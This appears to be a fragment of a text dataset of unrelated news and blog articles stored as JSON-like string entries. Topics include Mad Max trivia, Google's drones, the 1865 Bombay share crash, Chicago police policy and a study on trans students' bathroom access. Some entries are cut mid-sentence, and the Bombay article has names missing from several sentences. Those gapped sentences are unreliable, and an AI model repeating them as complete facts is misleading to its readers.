1972. As a doctor in the ER, he would see a constant influx of mangled car accident victims — these would later leak into Mad Max’s universe and aesthetic. In the film, an ambulance is referred to as a “meat truck”, a term Miller picked up in the ER. And did you know that Max has a last name? It’s Rockatansky, after Baron Carl von Rokitansky, the Bohemian pathologist who developed a procedure for removing internal organs at autopsy.\n\n6) Without Mad Max, There Would Be No Saw\n\nThe end of Mad Max sees our anti-hero in full vengeance mode. After taking care of the Toecutter, Max finally catches up with Johnny the Boy, who is looting a crashed car. Max handcuffs Johnny’s ankle to the overturned car, which is rapidly leaking gasoline. He rigs a lighter near the leak and throws Johnny a hacksaw – giving him the “option” to saw through his own ankle or the cuffs, which he’ll certainly never accomplish before he goes ka-boom. Sound familiar? Saw series creators James Wan and Leigh Whannell (Australians themselves) have credited this mean little finale as the inspiration behind the Saw franchise.\n\n5) The Toecutter Was a Shakespearean Actor\n\nIt’s easy to tell that the Toecutter is a classically trained Shakespearean actor, right? Versatile actor Hugh Keays-Byrne was born in India, raised in England, and moved to Australia in 1973 with the Royal Shakespeare Company. Before Mad Max he appeared in the classic biker film Stone and Mad Dog Morgan alongside Dennis Hopper. Keays-Byrne got to flex his classically trained muscles in Mad Max — improvising different accents in nearly every scene and hamming it up when threatened by May at the country hoome. He later appeared in two episodes of Farscape as slimy businessman Grunchlk.\n\n4) The Front of the Truck Was Fake\n\nWhen the Toecutter barrels full speed into the huge truck at the end, right after his eyes literally bug out of his skull, look closely. The entire front of the truck is a painted “shield.” Miller paid a truck driver $50 (and probably a slab of beer) to run over the motorcycle and the Toecutter dummy, but the driver didn’t want to mess the front of his rig up. So Miller had his prop department painted a big sheet of metal to resemble the rig’s front, headlights and all. Once you see it (1:08 in the video above) you’ll kick yourself for not noticing it before. It’s wonderfully obvious how fake the rig’s front is, but it never takes away from the awesome brutality of the collision.\n\n3) They Used Real Biker Gangs\n\nA lot of the extras in Toecutter’s crew were from real biker gangs – many of them even performed stunts. The crew recruited from a local Australian gang called the Vigilantes and from the Australian division of the Hell’s Angels as well. Because they were asked to show up on set in costume – prop weapons and all – Miller was afraid they would be stopped by the police. In case this happened, he gave the bikers “get out of jail” letters, which were basically typed statements on studio letterhead explaining that the bikers were movie extras. One of the members of the Vigilantes was the guy who gets hit in the head with the motorcycle during the bridge crash. Don’t worry, apparently it looked a lot worse in slow motion than it actually was. The biker brushed himself off and continued the shoot.\n\n2) The Stunt Man Did His Best Work with a Broken Leg\n\nLegendary Australian stuntman Grant Page coordinated and performed stunts in dozens of films in the ’70s and ’80s. He even starred in some films, including Roadgames, where he stalked Jamie Lee Curtis, and Stuntrock, where he did ridiculous stunts while a cheesy rock band called Sorcery performed. Page had a big hand in the stunts for Mad Max — doing both car and motorcycle work. His most clean looking stunt in the film is jumping the Interceptor through the camper during the film’s opening chase with the Nightrider. Even more badass than the actual car jump is the fact that Page did it with a broken leg.\n\nAs the story goes, Page was on his way way to the set when a semi-trailer cut off his motorcycle, causing him to swerve underneath the truck’s wheels. He made it beneath the truck safely, but the motorcycle collapsed on him and broke his leg. After getting it put in a cast, Page made it to the set to perform one of the best-looking stunts of all time. What did you do today?\n\nActually, there’s more than one broken leg story from the set of Mad Max. Sheila Florance, the actress who played shotgun-toting old May, stumbled over a rabbit hole during filming and broker her leg. She got a plaster cast on her hip and was on set the next day.",
  "latent_12556": "At Mobile World Congress this morning, Google's Sundar Pichai said that Titan, the drone company Google acquired in April of 2014, would be conducting its first test flight later this year. Google bought the company after it was widely reported Facebook had made an offer. Both were interested in the drone's ability to stay aloft for long periods of time with little energy and to carry a payload capable of providing internet connectivity to people down below.\n\nPichai says Titan is about where Project Loon, Google high altitude balloons, was a couple of years ago. The Titan team is building a new type of super lightweight solar-powered airplane that would be capable of hovering in one area of the stratosphere. This could provide a way to beam internet down to a targeted area on the ground below, supplement existing services with extra bandwidth, or providing access in an area that’s suddenly offline, like after an earthquake or other disaster.\n\nLoon and Titan could complement each other, providing what Pichai described as a mesh of flying cell towers circling overhead. While the balloons can be tricky to steer and cover a wide area, Titan aircraft could be maneuvered to provide capacity to particular areas based on demand. In both instances, Google's plan is to partner with carriers to provide overlapping service to people on the ground so that they don't have to worry about exactly where it's coming from. Pichai said the hope is to begin connecting some of the roughly 4 billion people on earth who currently don't have reliable internet access.",

He meant it, too. Jamie partnered up with Eric Sterman and Brent Bielmann to take a drone to a place where drones are not supposed to go. A place more forbidden (maybe not in the eyes of the law, or the morally sound) than the airspace above your topless sunbathing neighbor’s yard. He whipped into a wave at Teahupo’o with the drone — propellers spinning, tape rolling — then got barreled, came out and released the drone like a white wedding dove into a sunset. Beautiful, no? We called Jamie to get a better explanation as to how such beauty was born.\n\nJAMIE O’BRIEN: Eric and I have been talking about getting that clip for a while. We were talking about doing it at Pipe or Mainland Mexico, but we never ended up actually trying it. Then we were at Teahupo’o the other afternoon and he looked at me and said, “So you want to get a barrel with the drone?” The waves were perfect and we went for it.\n\nI had to get towed in so that I could already be holding the drone. Nobody else was towing at that point, so Niccola Porcella and I just sat out the back and waited for a set. It was difficult just trying to keep the drone dry out there. Eventually, a wave came and he put me in the perfect spot. I let go of the rope and was like, oh my god this is really going to happen.\n\nI remember looking at the drone in the barrel and not believing it. It was one of the most bizarre feelings I’ve ever had. I was trying so hard to keep the drone dry while still having to focus on making the barrel. It’s almost hard to explain. You’re just not supposed to put drones there [laughs]. Then I made it and let the drone go, and everyone on the boats started cheering and clapping. It probably felt like Eric Sterman won a contest.\n\nThanks, Jamie. And in a way, Eric did win a contest. He won the contest of your interest in the ever-competitive sphere known as the internet — there are plenty of topless drone neighbor clips out there, but you’ve invested your interest here instead. And here’s Eric’s victory speech. “You’ll be seeing a lot more of these new angles coming out by 2016.” Short, simple, and plenty sweet. We approve.",

The lifting of sanctions was a major part of the Iranian nuclear deal.\n\nNow, many European and U.S. companies are cautiously eyeing the Iranian market, despite uncertainty about what sort of business dealings will be allowed in the absence of many sanctions. Europe is opening up trade and business with Iran far more than the U.S has done.\n\nAs NPR's Steve Inskeep reported from Tehran earlier this month, \"scores of foreign business groups have come to Iran, but few are putting down money.\" This, despite clear business opportunities: \"Iran has a young and growing population of more than 75 million. It's the highly educated populace of an oil-rich republic.\"\n\nBut Roberto Cavalli's entry into the Iranian market might be an early sign of a possible \"luxury-shopping revolution,\" as the BBC termed it.\n\n\"The Iranian market is going through a new exciting period, and luxury brands such as Cavalli are looking at the country and its 80 millions of potential consumers with great attention,\" Roberto Cavalli CEO Renato Semerari says in a Women's Wear Daily article that was tweeted by his company. Here's more from Semerari:\n\n\"We think that Iran is set to become a very interesting market for luxury products, and we are happy to be among the first to open a monobrand in Tehran. ... For us it is a great chance to export also to this country Cavalli's high-quality fashion, recognized and appreciated all over the world.\"\n\nVogue described the Cavalli Spring 2016 Ready-to-Wear collection as \"street and nightclub-wear with an 80s spin,\" including \"skimpy body-con dresses, high-waisted animal-print jeans and leggings, sleeveless biker jackets, bandeau tops tied in pouf-y bows on one shoulder, and prom skirts trailing giant frilled trains in their wake.\"\n\nNo word whether all these styles will be featured in the Tehran store, which is located in the posh Tehran neighborhood of Zafaraniye. According to Women's Wear Daily, the two-floor boutique \"features lavish, light-reflecting floors made of large slabs of dark brown quartzite mixed with crystal dust. Dark brown pony hair carpets pepper the floors.\"\n\nIranian shoppers haven't been completely cut off from designer fashions despite decades of sanctions. Tehran is home to luxury malls featuring major Western brands. But as the BBC reports:\n\n\"Although these luxury shopping centres look exactly the same as retail outlets anywhere in the world, the designer goods on display have actually been brought in by third-party importers via Turkey and the Gulf States. \"The outlets that sell them have no connection to the big brand manufacturers.\"\n\nMost Western clothing brands have been deterred by international banking sanctions that made it difficult to get their profits out of Iran, the BBC reports.\n\nMeanwhile, it adds, \"Iranians have developed a taste for high-end designer goods.\"\n\nThe poster children for the well-heeled, young Iranians that brands such as Roberto Cavalli are hoping to reach might well be those in \"The Rich Kids of Tehran.\" It's an Instagram account featuring ultra-wealthy Iranian teens wearing designer clothing and living opulently.",

The liberal grass-roots group has endorsed Mr. Sanders, and has sought to come to his aid as he has been criticized by Mrs. Clinton for his record on gun control.\n\n“We, the undersigned, all lead groups who have been deeply involved in the cause of gun safety for many years, and we were taken aback by D.F.A.’s recent press release arguing that Senator Bernie Sanders has a ‘strong record against gun violence,'” officials with the groups wrote. They singled out Charles Chamberlain, the executive director for D.F.A., saying that anyone who “purports to be a progressive on this issue would conclude precisely the opposite.”\n\nThe Brady Campaign and Ms. Giffords have endorsed Mrs. Clinton, who has made gun control, an area where she has been to the left of Mr. Sanders, a central issue of her candidacy. The issue has taken on new urgency amid a string of mass shootings across the country.\n\nThe letter went on to say that there have been “two monumentally important votes in Congress on gun safety, and Senator Sanders was wrong on both of them.” One was in support of the so-called Brady Bill, which established the federal background checks system, and the other was a 2005 bill that gave gun manufacturers legal immunity. Last weekend, before the final Democratic primary debate before the Iowa caucuses, Mr. Sanders changed his position on that issue.\n\n“These were the decisions that have really mattered,” they wrote.\n\nMr. Sanders has strongly defended himself against Mrs. Clinton on the issue of guns, noting that he has a D-minus rating from the National Rifle Association.\n\nThe letter from the three groups to Democracy for America argued that those ratings are based on a number of factors, not solely votes related directly to guns.\n\n“We trust that with this new understanding of the gun safety record of Senator Sanders, coming from people who have fought for the progressive position in this debate, your organization will retract its mistaken characterization,” the officials with the groups wrote.\n\nIn an interview, Mr. Chamberlain described Third Way as “a Wall Street front group” and criticized it for an attack “on the purity of progressive issues.”\n\n“I think it’s a little disappointing to see our friends at the Brady Campaign” being “misled” on the subject, said Mr. Chamberlain, noting that Mr. Sanders has repeatedly supported background checks.\n\n“If that isn’t a clear, strong record on gun safety, then I don’t know what is,” he said.",

  "latent_13031": "Mama Grizzly Sarah Palin has recently awoken from her political hibernation with a strange new interest in Donald Trump. During a much-maligned speech Friday in Wisconsin stumping for her candidate of choice, Palin claimed a candidate in the GOP was “inducing and seducing” illegal immigrants with “a gift basket of teddy bears and soccer balls.” This is a not-so-veiled shot aimed at Senator Ted Cruz, Donald Trump’s main opponent in the GOP race, and Cruz’s trip in 2014 to the Texas-Mexico border.\n\nIs Palin completely misrepresenting Cruz’s (and others) trip? You betcha. And the reason I know is because I was there.\n\nOutside of spin from Trump’s professional stenographers and self-appointed propaganda outlets, most were confused by this “gift basket” concept presented by Palin. The former VP candidate took to Facebook herself to affix her aim at the “lamestream media” for their criticism. Giving Palin the benefit of the doubt, she is severely misinformed about those “teddy bears and soccer balls.”\n\nIn July of 2014, Ted Cruz joined many from TheBlaze (including myself, who at the time was VP of Digital Content) and Glenn Beck’s charity operation Mercury One to deliver more than $2 million in food, supplies and toys to unaccompanied minor illegal immigrants who were crossing the border from Mexico into McAllen, Texas. Besides Beck and Cruz, others who were there included Dana Loesch, Mike Broomhead, Alveda King, Pat Gray and Rep. Louie Gohmert. Does Palin think Gohmert is soft on immigration? The thinking was this: illegal immigrant children were coming, and in many cases being forced, across the border. Churches and other volunteers were taking it upon themselves to take care of them for a few days before they could find a home for them. They were understaffed and lacking supplies. Mercury One raised money privately to help in this effort.\n\nThis operation was by no means an incentive to come across the border. It was also, as some have incorrectly implied, not some secretive mission that shows what Cruz really believes about the issue of illegal immigration. Here’s my Instagram picture of that day of Cruz unloading boxes. (I’d urge you to look through some of the other pictures from that day that show how deplorable these conditions were.)\n\nThis had nothing to do with politics. But don’t take my word for it — here’s my short interview with Ted Cruz after we had toured the facility. He summed it up very clearly:\n\nOur country has always been a country of compassion, of humanity. And these children, while they’re here, we need to care for them, we need to demonstrate American values, but it’s critical as well that we need to uphold the rule of law. The reason these children are coming is because they believe they’ll get amnesty, they’ll get a permiso, and if they get here they’ll be allowed to stay. As long as that promise of amnesty is there more and more children will come, and more and more children will be brutalized, physically assaulted, sexually assaulted by violent drug cartels the coyotes are bringing in. In my view, it is altogether appropriate that private charities and private churches are showing Christian love, are caring for these children. But at the same time we need to eliminate the promise of amnesty. I filed legislation to do that, to make clear President Obama has no legal authority to grant amnesty whatsoever. And we need to expeditiously and humanely return these children, reunite them with their families back home.\n\nThat legislation he was citing had been introduced by Cruz just days before. He spoke about it on Fox News Sunday the next day.\n\nWhy is it so difficult for some Trump supporters to possess the ability to think with nuance? Clearly a person can be against the policy that was bringing illegal immigrant children to America — and the policy that the Obama administration was continuing once they arrived — while still having compassion for the lives of the children caught in the crossfire.\n\nPalin’s misrepresentation feeds the Trump trolls, and further fractures a party and country being torn apart at the seams.",

  "latent_13079": "Chicago Police appear to be backtracking on a major platform of their new deadly force policy, relating to whether officers should attempt to save the lives of people they have just shot. Phil Rogers reports.\n\nChicago Police appear to be backtracking on a major platform of their new deadly force policy, relating to whether officers should attempt to save the lives of people they have just shot.\n\nIn a recent scathing report on CPD policies, the U.S. Justice Department said Chicago officers should be required to give medical treatment to suspects shot by police. Currently, officers are only required to call for a Fire Department ambulance.\n\nIn that Justice report, investigators said CPD should “equip officers with appropriate first-aid supplies, train them in their use…and require officers to render aid to injured persons, consistent with the officer’s training.”\n\nIn January, Chicago police insisted the policy was about to change. A draft copy of a new use-of-force model declaring an emphasis on “sanctity of life” carried a provision for officers to begin offering medical aid “commensurate with their training, experience, and available equipment.”\n\nCritics argued that a change was long overdue.\n\n“There is a significant time lag, whether it’s two or three or four minutes, from the time the police call the firemen until the time they arrive,” says attorney Victor Henderson. “That three or four minute difference can be the difference between life and death.”\n\nHenderson represented the family of 23-year-old Jamaal Moore, who was shot following a police chase on Chicago’s South Side. Moore was unarmed, and after the shooting police were seen standing over him as he lay dying, but offering no apparent aid.\n\n“They’re just there like, we caught a deer or something,” said Moore’s mother Gwendolyn Moore. “They’re happy and they’re excited about it because they were smiling, and my son is lying on the ground, and you could clearly see that he was alive.”\n\nBy the time the fire department arrived and Moore was transported to a hospital, he was dead.\n\nBut now CPD’s changed procedures have apparently been changed again. A new draft policy, released this week for public comment, changes the wording that officers “will” offer treatment, to officers “may” offer treatment.\n\n“We received a number of objections to the medical aid requirement,” an accompanying memo states. “Most notably, commenters suggested that the Department does not provide officers proper medical training or equipment to comply with this requirement, subjecting them to legal liability for providing improper care.”\n\nThe memo noted that under Illinois law, officers are not civilly liable to an injured person for providing emergency care unless the officer engaged in “willful and wanton misconduct”. Nevertheless, a change was made.\n\n“We understand after reviewing the comments that some officers do not feel properly trained to provide medical care to an injured person at the scene,” the memo stated. “Therefore, we have revised this section to require officers to request emergency medical services…but the requirement does not extend to providing medical care, although officers remain free to do so.”\n\nIn Washington D.C., Jim Bueermann, the president of the Police Foundation, a law enforcement research and training organization, said he felt CPD was going in the wrong direction on its medical aid policy.\n\n“One of the hallmarks of a healthy police department is they are founded on enhancing the public trust,” Bueermann told NBC 5. “If you believe in the sanctity of life, how can you give the option to officers?”\n\nBueermann agreed that policies calling for officers to provide medical aid may represent a cultural change in some departments. But he said it was the right thing to do.\n\n“Our recommendation is that departments have policies, training, and equipment, to transition from threat mitigation, to lifesaving,” he said. “We’ve got to change from, ‘I stopped the threat,’ to now lifesaving. And if (officers) don’t want to do that, they’re in the wrong job.”\n\nThe Jamaal Moore case in Chicago was not an isolated incident. Rather, it was a reflection of longstanding departmental policy. Last summer, officers shot an unarmed auto theft suspect named Paul O’Neal. O’Neal rammed a squad car and fled on foot into a residential area, where he was shot. Body cam videos from the many officers on the scene show some checking each other for injuries, but do not show any offering medical treatment to O’Neal.\n\n“There is a human being who’s laying on the ground who needs to be helped,” Henderson, the Moore family attorney said. “And they should do everything they can to help that person, short of putting themselves in danger.”\n\nChicago’s Police union chief was among those who had been critical of the new directive.\n\n“People want the police officers to be jacks of all trades,” Dean Angelo, president of Fraternal Order of Police Lodge 7 said in January. “They want us to do everything!”\n\nEchoing the comments in this week’s memorandum, Angelo had expressed reservations about what kind of training his members would receive.\n\n“It can’t be a streaming video where you sit at roll call, you watch the tape, you grab your first aid pouch and you get in your squad car,” he said. “You need almost a 40 hour bloc to be proficient on those pouches.”\n\nFor her part, Gwendolyn Moore said she believes those concerns beg a larger question, that all people should want to help one another, regardless of the circumstances.\n\n“You see a person in distress and you automatically want to assist them in any way you can because that’s part of being human, part of caring about mankind and humanity,” she said. “That’s what we do!”\n\nPolice department spokesman Anthony Guglielmi emphasized that the change was still in draft form. “We are putting it out again for public comment, because we value community input.”",

  "latent_13767": "It's been 18 months since our BETA made an ironic splash on April 1st 2012. We figured it's time to communicate what our goals are for a 1.0 general release.\n\nBut first, a quick recap of what our team has accomplished in the last year and a half:\n\nPlayer movement The player movement code (pmove, for short) has been significantly refactored to feel more like Quake II, but more consistent and accessible to new players. Also, mods will now be able to provide their own pmove implementations, thanks to efforts to move client-side prediction into the cgame module. We hope that this will encourage more inventive ports of popular Quake II mods like Action and D-Day. PhysicsFS The popular PhysicsFS filesystem abstraction library used by the Build Engine and other notable games replaced our Quake2-legacy virtual filesystem (VFS) implementation. PhysFS is highly performant, completely portable and well-tested. It also supports numerous archive formats such as .pk3 . PK3 Archives All of Quake2World's assets are now bundled in Quake III: Arena .pk3 (ZIP) archives. This brought our game data down in size from 500M to 200M. Our BSP compiler, Q2WMap, has been updated to automatically create .pk3 archives from your custom maps, too. GtkRadiant support Mapping for Quake2World has never been easy, especially for Windows users. We have teamed up with GtkRadiant and taken tremendous strides to eliminate the barriers and snags to mapping for Quake2World, on all 3 major platforms. More on that below! GLib The core foundation of the GNOME platform, GLib was integrated to provide universal string handling, path name manipulation and collections management. The consistency and efficiencies gained by leveraging GLib throughout the code allowed us to eliminate dozens of small, old bugs and greatly reduce level loading times. Github Slightly late to the game, Quake2World migrated to Github back in June. The code and data live in separate repositories: quake2world and quake2world-data. If you find bugs in the current BETA, you are encouraged to file issues there. Jenkins maci was good enough to invest hours and hours into setting up a proper continuous integration environment for us running Jenkins. While the Jenkins portal itself isn't directly helpful for end-users, it has greatly improved the availability of our builds.\n\nSo What's Left?\n\nMaps!\n\nOur highest priority for the 1.0 general release is to provide quality remakes of the classic Quake II deathmatch levels. Panjoo has started us off on the right foot with his superb rework of The Edge, and TRaK, before retiring from the project, gave us an excellent head-start with initial cuts of The Frag Pipe and The Warehouse featuring his own original textures.\n\nWe are seeking new mappers to pick up the torch and see these maps through to completion, and to port the remaining Quake II deathmatch levels as well. And to that end, we've upped our game by providing the very best tools and support we've offered to date.\n\nGtkRadiant\n\nSince Quake2World's inception, the NetRadiant editor has been our tool of choice for level editing. Unfortunately, NetRadiant seems all but unmaintained these days, and several long-standing issues with it led us to seek an alternative. While we may eventually support NetRadiant again in the future, it was time to make a change..\n\nBy joining up with TTimo's GtkRadiant maintenance effort, we have fixed several long-standing issues for mappers on the Windows platform. Namely, GtkRadiant 1.6.4 now supports per-user game data directories, so mappers no longer have to navigate the perils of placing their custom assets in the official game directory (where Quake2World's Update process will delete) them just to make them visible to Radiant.\n\nAdditionally, Q2WMap now integrates with GtkRadiant, allowing BSP process monitoring through the in-editor BSP compilation menu. This allows Q2WMap to send realtime feedback directly to the Radiant user interface, and select malformed brushes, point the user to leaks, etc. Moreover, all of the compiler's output gets logged right in the Radiant console -- no more console window popping up and then disappearing before you can read the results.\n\nFor the first time ever, users of Mac OS X will be able to create levels using GtkRadiant, too. As a Mac user myself, it was imperative for me to have a working editor, and so I'll now be providing packaged OS X builds of GtkRadiant for users running Lion and Mountain Lion. Snow Leopard users will be able to compile their own copy by following my build instructions. Look for the OS X builds of GtkRadiant 1.6.4 to appear on the project site soon.\n\nUPDATE: Mac builds of GtkRadiant 1.6.4 available here: http://icculus.org/gtkradiant/downloads.html#binaries\n\nFinally, the Quake2World entities definitions file for GtkRadiant has been completely rewritten to be more accurate and readable. Frankly, it's at least as good as Quake III: Arena's, which should make mapping for Quake2World less confusing and more productive than ever.\n\nLinux server binaries\n\nWhile client binaries for GNU / Linux have proven difficult to provide in any distro-agnostic way, we are committed to providing dedicated server builds for i686 and x86_64 Linux, complete with an rsync-based update channel. Expect to see this in Q4 of 2013.\n\nMore goodies\n\nAs we march towards these primary goals, many smaller fixes and enhancements will continue to flow into the project: revamped weapon models, weapon spin-up times, new player models, expanded gameplay modes and more general polishing are sure to come. In fact, you can keep tabs on the items we're tackling for 1.0 by watching these milestones on Github:\n\nI'd also like to mention that, \"post-1.0,\" we'll be taking on more major challenges such as AI and bots, upgrading to SDL 2.0, and providing more user-friendly in-game menus. But for right now, we're focused on our 1.0 goals and..\n\nWe need your help\n\nSounds like a lot of work, doesn't it? That's why we need your help. Contribute or spread the word! If you have a skill set like mapping, texturing or programming, or if you know someone who does, please get in touch on our forums or IRC (#quetoo on irc.freenode.net). Want to help beta test? That's cool, too -- post a thread or say hello on IRC. All levels of contribution and participation are welcome.\n\nThanks for taking the time to read this,\n\nJay (jdolan)",
  "latent_13803": "was unhappy. Bank of Bombay, of which he was director, was increasingly gravitating towards laxity. It wanted to lend against the shares of other banks, a decision he vehemently opposed.\n\nIt was 1863. The Sepoy Mutiny of 1857 in the Indo-Gangetic plains had been put down brutally. The control of India had passed from the East India Company to the British crown. Parsi and Gujarati brokers had been trading in shares for eight years at different locations in Bombay (the would be born 12 years later), and a roaring bull market was underway.\n\nShare prices of companies that didn't exist till a few years ago were rising astronomically. share, with face value of Rs 5,000, traded at Rs 50,000. Bank of Bombay's Rs 500 share touched Rs 2,850.\n\nThe source of all the speculation lay in events taking place in distant United States where Abraham Lincoln, the 16th president, and his campaign against slavery had triggered a civil war.\n\nThe conflict choked the traditional source of cotton for the British. The cloth mills of Birmingham and other places soon turned to India, buying up all they could and more. The average exports prior to the war were 528,000 bales - they expanded to over 1.2 million bales by 1865.\n\nThis was a period of unprecedented prosperity for those engaged in the cotton trade. Cotton was called \"white gold\"and its demand grew so large that traders grabbed anything they could lay their hands on, even tearing apart mattresses and pillows so that they could sell the stuffing.\n\nNew beds, they say, began to be made of coir fibre - cotton had become far too valuable to sleep on.\n\nThe money they made from selling cotton to the English was deployed in the share market. The rise in the market was also fuelled by investors who managed to get loans from banks to invest in shares. The investors were certain that the shares would continue to rise as the cotton boom rolled on, and banks were certain that the money loaned at high interest rates would be safe. Both, say historians, were right; but only for a time.\n\nReadymoney feared it would all come to grief one day.\n\n\"Such practice will induce greatly more gaming in shares. I would wait and never have this sort of dangerous business for the present,\" he registered his protest. \"We are only following the example set by Bank of Bengal, but we must not follow them. Their gross mismanagement of this kind brought to total ruin, whose board was composed of highly, more than highly, respectable gentleman; two baronets, one gone to jail, another run away to England, and other three ruined for life.\"\n\nincluded amongst its original shareholders Dwarkanath Tagore, the grandfather of Nobel laureate Rabindranath Tagore. The bank collapsed shortly after Dwarkanath Tagore passed away. The Tagore family, and indeed the whole of Calcutta, faced financial difficulties for some time afterwards.\n\nReadymoney felt the same story would play out in Bombay. But he was dogged by ill health and advancing age. The breaking point finally came when Bank of Bombay increased its capital despite his express opposition. He resigned.\n\nThe institution was the poorer without Readymoney. In the absence of his calming influence, Bank of Bombay became one of the key sources for capital for the speculation mania as it reached some kind of frenzy.\n\n\"…ordinary clerks, officers, pleaders, adventurists, editors, and even sweepers had started dreaming about minting money. At the junction of the Meadows Street and Rampart Row…hordes of brokers and speculators would gather that would lead to terrible traffic jam. Share mania had turned Mumbai mad,\" says historian Amrit Gangar, author of 24 x 7 = Mumbai (Arunodaya Prakashan, Ahmedabad, 2011)\n\nThe man who replaced Readymoney at the position of influence in Bank of Bombay was Premchand Roychand, a financial whiz kid and beloved of the masses. Crowds would gather from early morning at his Byculla bungalow. Young and old, rich and poor, they all came to him, attracted like moths to a flame. Everybody wanted to meet the man with the golden touch, and maybe lay his hands on a share or two.\n\nRoychand came from a modest background but had done well for himself. He liked to donate to charities generously - like Readymoney.\n\nReadymoney had gifted the city a convocation hall, an ophthalmic hospital, an art gallery and 40 drinking water fountains. His surname is said to have come from his ready disposition to distribute his money. Roychand gave to the university, and helped build Rajabai Tower, the tallest structure in Bombay at that time.\n\nRoychand also possessed prodigious financial talent and a decidedly speculative streak. Every new company looked to get him on board as a promoter or took his advice about who should be given the shares that were just waiting to soar in value.\n\nNot even the government was immune.\n\nOn November 16, 1864, Bartle Frere, the governor of Bombay, issued a circular in which he cautioned civil servants from involving themselves in shares during \"the present period of excitement\". He had noticed that a significant number of government employees had been investing in the market.\n\nBut the circular seemed to have had little effect. Most had made more money in the than they would in all their years of service - giving it all up didn't make sense. In one of the earliest instances of conflict of interest, some were even found to have bought stakes in companies they dealt with in official capacity.\n\nThe boom saw hectic corporate activity. In December 1864, there were 31 banks, 16 financial associations, 8 land companies, 16 press companies, 10 shipping companies, 20 insurance companies as against a total of 10 in 1855. In 1855, there were no joint stock companies at all. By 1862, there were 62.\n\nThe newspapers were full of advertisements for new share issues and other business such as annual general meetings for shareholders.\n\nBut some sections also sounded a warning. \"We must rebuke the wild rage going on…This must end in a fearful smash, and we warn the Bombay public to beware!,\" said one of the saner voices.\n\nWhat contributed to the bull-run were \"time bargains\", essentially forward contracts, which made it easier for people to bet on the rising share prices. Though conflicting reports exist, there do seem to have been some attempts to defuse the situation.\n\nGovernor Frere attempted to pass what was called the Wager's Bill that would have clamped down on these time bargains. The move was stoutly opposed by merchants. Jivraj Balloo, the most important cotton trader of the time, signed a petition against the Bill. So did Roychand. Also opposed to the Bill were over 250 British firms that felt that its provisions interfered with free trade.\n\nFrere prevailed nonetheless and managed to get the Bombay Legislative Council to pass the Bill. It was sent to John Lawrence, the Viceroy and governor general, for assent in November 1864. Unbelievably, the Bill was lost in transit between Shimla and Calcutta before it could be signed into law.\n\nBy the time Lord Lawrence could sign it and bring it into operation, it was too late. The bubble had burst two months ago.\n\nshares fell from Rs 50,000 to under Rs 2,000 - a fall of over 96 per cent. Bank of Bombay's shares which sold at Rs 2,850 were down to Rs 87.\n\nThe meltdown happened because the American Civil war ended in May 1865, which caused cotton prices to fall in anticipation of resumption of supplies from the United States. Exports collapsed and would take another quarter century to reach the same level as 1865.\n\nThe effect on the city's elite was utter ruin. Imagine if the Tatas, Birlas and Ambanis all went bust at once today. For the Bombay of the time, this actually happened.\n\nThe premier business houses of that time, the so-called merchant princes of Bombay, saw their wealth evaporate before their very eyes. Behramji Hormusji Cama went under after failing to come up with Rs 3.3 crore. Other failures include Rustomji Jamsetji Jejeebhoy and Kharshedji Furdunji Parekh. These were premier business families of the city, the names of many still survive through the educational institutions and hospitals they funded.\n\nThe disaster didn't drain the city just economically - its population declined by 21 per cent in the years following the crash. There were estimated to be 816,000 people in Bombay in 1864 - the census of 1872 put the population at 644,000.\n\nThis was said to be on account of the \"migration from Bombay of the swarms of adventurers and labourers from all parts of India and from abroad who were attracted to the city by the speculative enterprises and the high prices of labour which marked the season of unexampled prosperity\".\n\n\"The stock market crash of 1865… was the first major event of this kind in the history of this country. Most of the measures to prevent such occurances were yet to be introduced in the prevailing company law,\" says historian Dwijendra Tripathi who authored The Oxford History of Indian Business.\n\nThe first rudimentary regulation governing securities market would only be introduced in 1925, a full 60 years after the stock market's first great crash.\n\nKey sources\n\n1.

It does not include thousands of warheads that have been disabled or all but dismantled. Those weapons could, in theory, be reconstituted, or their nuclear material repurposed.\n\nEstimates of the total U.S. arsenal range from slightly more than 8,000 to above 9,000, but the Pentagon will not give a precise number.\n\nWhether to reveal the full total, including those thousands of nearly dead warheads, was debated within the Obama administration. Keeping those weapons out of the figure released Monday represented a partial concession to intelligence agency officials and others who argued national security could be harmed by laying the entire nuclear arsenal bare.\n\nA senior defense official, speaking on condition of anonymity because the overall total is still classified, did not dispute the rough estimates developed by independent analysts.\n\nExposure of once-classified totals for U.S. deployed and reserve nuclear weapons is intended to nudge nations such as China, which has revealed little about its nuclear stockpile.\n\n\"You can't get anywhere toward disarmament unless you're going to be transparent about how many weapons you have,\" said Sharon Squassoni, a nuclear policy analyst at the Center for Strategic and International Studies.\n\nRussia and the United States have previously disclosed the size of their stockpiles of deployed strategic weapons, and France and Britain have released similar information. All have signed the Nuclear Nonproliferation Treaty, which is the subject of the U.N. review that began Monday.\n\nThe U.S. revelations are calculated to improve Washington's bargaining power with Iran's allies and friends for the drive to head off what the West charges is a covert Iranian program to build a bomb.\n\nIranian President Mahmoud Ahamadinejad spoke ahead of Clinton at the conference, denouncing U.S. efforts to pressure his regime to abandon its nuclear program.\n\nThe U.N. conference will try to close loopholes in the internationally recognized rules against the spread of weapons technology.\n\nIndependent analysts estimate the total world stockpile of nuclear warheads at more than 22,000.\n\nThe Federation of American Scientists estimates that nearly 8,000 of those warheads are operational, with about 2,000 U.S. and Russian warheads ready for use on short notice.\n\nThe United States and Russia burnished their credentials for insisting that other countries forgo atomic weapons by agreeing last month to a new strategic arms reduction treaty.\n\nThe New START treaty sets a limit of 1,550 deployed strategic nuclear warheads for each side, down from 2,200 under a 2002 deal.

  "latent_14008": "Social Media, Psychology\n\nBathroom safety for trans students significantly impacts their overall school security, self-esteem and grades\n\nHeidelberg | New York, 30 March 2017\n\nEducational policies and practices should explicitly ensure the wellbeing and healthy development of all students by supporting the right of students to use a bathroom in an institutional context that affirms their gender identity and expression. There are many ways that this can occur including providing gender-neutral restrooms in schools, says Laura Wernick of Fordham University in the US, lead author of a study in Springer’s Journal of Youth and Adolescence. Co-authored with Alex Kulick and Matthew Chin, the study showed that ensuring safe access to bathrooms and other school facilities for trans students is vital if educational equality is to be ensured.\n\nThe issue of bathroom access to trans youth has been of great significance in the United States since President Donald Trump issued a directive earlier in the year to rescind protection of transgender students. The rights of such high school students to use the bathroom associated with their gender is currently also the subject of legal deliberation by US courts. In this regard, Wernick and her team’s research makes an important contribution, as very few empirical studies have so far focused on this issue within the context of high schools.\n\nThe researchers analyzed a multi-school climate survey conducted in 2014 at five public high schools in southeast Michigan to examine the relationship between students’ gender identity, how safe they felt using bathroom facilities at school and their grades and self-esteem. The school climate was also taken into account, and how much acceptance people from different sexual identities enjoyed. The study also took into account school climate, race, sexual orientation and grade level.\n\nConsiderable variation in the ability 